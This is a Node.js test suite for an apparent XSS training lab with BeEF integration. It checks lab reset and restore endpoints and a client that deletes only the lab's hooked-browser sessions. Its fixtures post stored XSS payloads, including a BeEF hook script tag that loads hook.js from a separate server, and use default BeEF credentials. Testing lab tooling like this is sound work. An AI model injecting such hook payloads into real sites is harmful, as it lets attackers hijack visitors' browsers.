import test from 'node:test';
import assert from 'node:assert';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createApp } from '../src/server/app.js';
import { resetMessages, getMessages } from '../src/storage/messageStore.js';
import { BeefClient } from '../src/storage/beefClient.js';
import { restoreFullLab, purgeRuntimeDataFiles } from '../src/storage/labStore.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_DIR = path.resolve(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'messages.json');

function makeRequest(server, reqPath, method = 'GET', body = null) {
  return new Promise((resolve, reject) => {
    const address = server.address();
    const options = {
      hostname: '127.0.0.1',
      port: address.port,
      path: reqPath,
      method: method,
      headers: {}
    };

    if (body) {
      if (typeof body === 'object') {
        options.headers['Content-Type'] = 'application/json';
        body = JSON.stringify(body);
      }
      options.headers['Content-Length'] = Buffer.byteLength(body);
    }

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data
        });
      });
    });

    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

test('Full Lab Factory Restore & Genuine BeEF Integration Suite', async (t) => {
  const app = createApp();
  const server = http.createServer(app);

  await new Promise((resolve) => {
    server.listen(0, '127.0.0.1', resolve);
  });

  t.beforeEach(() => {
    resetMessages();
    purgeRuntimeDataFiles();
  });

  t.after(() => {
    server.close();
    resetMessages();
    purgeRuntimeDataFiles();
  });

  await t.test('1. Module Reset (POST /api/stored/reset) resets only messages.json', async () => {
    // Add custom message
    await makeRequest(server, '/api/stored/messages', 'POST', {
      author: 'Module Tester',
      content: '<script>alert("module-reset")</script>'
    });

    const msgsBefore = getMessages();
    assert.strictEqual(msgsBefore.length, 3);

    // Call Module Reset
    const res = await makeRequest(server, '/api/stored/reset', 'POST');
    assert.strictEqual(res.statusCode, 200);
    const body = JSON.parse(res.body);
    assert.strictEqual(body.success, true);
    assert.strictEqual(body.count, 2);

    const msgsAfter = getMessages();
    assert.strictEqual(msgsAfter.length, 2);
    assert.strictEqual(msgsAfter[0].author, 'Alice');
  });

  await t.test('2. Full Lab Restore (POST /api/lab/restore) cleans datastore and runtime artifacts', async () => {
    // Create runtime files to simulate active lab usage
    const sessionsFile = path.join(DATA_DIR, 'sessions.json');
    const eventsFile = path.join(DATA_DIR, 'events.json');
    const telemetryFile = path.join(DATA_DIR, 'telemetry.json');

    fs.writeFileSync(sessionsFile, JSON.stringify({ active: true }));
    fs.writeFileSync(eventsFile, JSON.stringify([{ type: 'xss_test' }]));
    fs.writeFileSync(telemetryFile, JSON.stringify([{ test: 'beacon' }]));

    // Add stored XSS payload
    await makeRequest(server, '/api/stored/messages', 'POST', {
      author: 'Attacker Hook',
      content: '<script src="http://127.0.0.1:3001/hook.js"></script>'
    });

    assert.ok(fs.existsSync(sessionsFile));
    assert.ok(fs.existsSync(eventsFile));
    assert.ok(fs.existsSync(telemetryFile));
    assert.strictEqual(getMessages().length, 3);

    // Perform Full Restore
    const res = await makeRequest(server, '/api/lab/restore', 'POST');
    assert.strictEqual(res.statusCode, 200);
    const body = JSON.parse(res.body);
    assert.strictEqual(body.success, true);
    assert.ok(body.message.includes('restored') || body.message.includes('factory state'));

    // Verify messages reset
    const msgs = getMessages();
    assert.strictEqual(msgs.length, 2);
    assert.ok(!msgs.some(m => m.content.includes('hook.js')));

    // Verify runtime files purged
    assert.ok(!fs.existsSync(sessionsFile), 'sessions.json must be purged');
    assert.ok(!fs.existsSync(eventsFile), 'events.json must be purged');
    assert.ok(!fs.existsSync(telemetryFile), 'telemetry.json must be purged');
  });

  await t.test('3. Full Lab Restore is idempotent (safe to run multiple times)', async () => {
    const res1 = await makeRequest(server, '/api/lab/restore', 'POST');
    assert.strictEqual(res1.statusCode, 200);

    const res2 = await makeRequest(server, '/api/lab/restore', 'POST');
    assert.strictEqual(res2.statusCode, 200);
    const body2 = JSON.parse(res2.body);
    assert.strictEqual(body2.success, true);
    assert.strictEqual(body2.storage.messagesCount, 2);
  });

  await t.test('4. BeEF Session Filtering: Identifies lab sessions and preserves unrelated sessions', async () => {
    const client = new BeefClient();

    const labHook = {
      id: 1,
      session: 'lab-session-xyz',
      ip: '127.0.0.1',
      port: '3000',
      domain: '127.0.0.1',
      page_uri: 'http://127.0.0.1:3000/labs/stored'
    };

    const externalHook = {
      id: 2,
      session: 'external-session-abc',
      ip: '192.168.1.50',
      port: '8080',
      domain: 'target.corporate.local',
      page_uri: 'http://target.corporate.local/profile'
    };

    assert.strictEqual(client.isLabSession(labHook, '127.0.0.1', 3000), true);
    assert.strictEqual(client.isLabSession(externalHook, '127.0.0.1', 3000), false);
  });

  await t.test('5. Genuine BeEF REST API Mock: Authenticates, lists hooks, and deletes lab session', async () => {
    let loginCalled = false;
    let hooksCalled = false;
    let deleteCalled = false;
    let deletedSessionId = null;

    // Mock local BeEF REST server
    const beefServer = http.createServer((req, res) => {
      const url = new URL(req.url, `http://${req.headers.host}`);

      if (req.method === 'POST' && url.pathname === '/api/admin/login') {
        loginCalled = true;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true, token: 'mock-beef-auth-token-123' }));
      }

      if (req.method === 'GET' && url.pathname === '/api/hooks') {
        hooksCalled = true;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          'hooked-browsers': {
            online: {
              '0': {
                id: 1,
                session: 'lab-hook-session-999',
                ip: '127.0.0.1',
                port: '3000',
                domain: '127.0.0.1',
                page_uri: 'http://127.0.0.1:3000/labs/stored'
              },
              '1': {
                id: 2,
                session: 'unrelated-hook-session-777',
                ip: '10.0.0.5',
                port: '80',
                domain: 'other.domain.com',
                page_uri: 'http://other.domain.com/'
              }
            },
            offline: {}
          }
        }));
      }

      if (url.pathname.startsWith('/api/hooks/') && url.pathname.endsWith('/delete')) {
        deleteCalled = true;
        deletedSessionId = url.pathname.split('/')[3];
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true }));
      }

      res.writeHead(404);
      res.end();
    });

    await new Promise(resolve => beefServer.listen(0, '127.0.0.1', resolve));
    const beefPort = beefServer.address().port;

    try {
      const client = new BeefClient({
        apiUrl: `http://127.0.0.1:${beefPort}`,
        username: 'beef',
        password: 'beef'
      });

      const cleanResult = await client.cleanLabSessions({ labHost: '127.0.0.1', labPort: 3000 });

      assert.strictEqual(loginCalled, true, 'BeEF login was called');
      assert.strictEqual(hooksCalled, true, 'BeEF hooks list was queried');
      assert.strictEqual(deleteCalled, true, 'BeEF session delete was called');
      assert.strictEqual(deletedSessionId, 'lab-hook-session-999', 'Only lab session was deleted');
      assert.strictEqual(cleanResult.cleanedCount, 1);
      assert.strictEqual(cleanResult.preservedCount, 1);
      assert.strictEqual(cleanResult.status, 'cleaned');
    } finally {
      beefServer.close();
    }
  });

  await t.test('6. Graceful Handling when BeEF is offline/unreachable', async () => {
    // Connect to a closed port where BeEF is not running
    const client = new BeefClient({
      apiUrl: 'http://127.0.0.1:49999',
      timeout: 500
    });

    const cleanResult = await client.cleanLabSessions({ labHost: '127.0.0.1', labPort: 3000 });
    assert.strictEqual(cleanResult.success, false);
    assert.strictEqual(cleanResult.status, 'unreachable_or_auth_failed');

    // Lab restore itself still succeeds cleanly
    const restoreResult = await restoreFullLab({
      labHost: '127.0.0.1',
      labPort: 3000,
      beefClientInstance: client
    });

    assert.strictEqual(restoreResult.success, true);
    assert.ok(restoreResult.message.includes('BeEF'));
    assert.strictEqual(restoreResult.beef.status, 'unreachable_or_auth_failed');
  });

  await t.test('7. Layout includes "Restore Entire Lab" button and prompt structure', async () => {
    const res = await makeRequest(server, '/');
    assert.strictEqual(res.statusCode, 200);
    assert.ok(res.body.includes('Restore Entire Lab'));
    assert.ok(res.body.includes('restoreEntireLab'));
  });
});
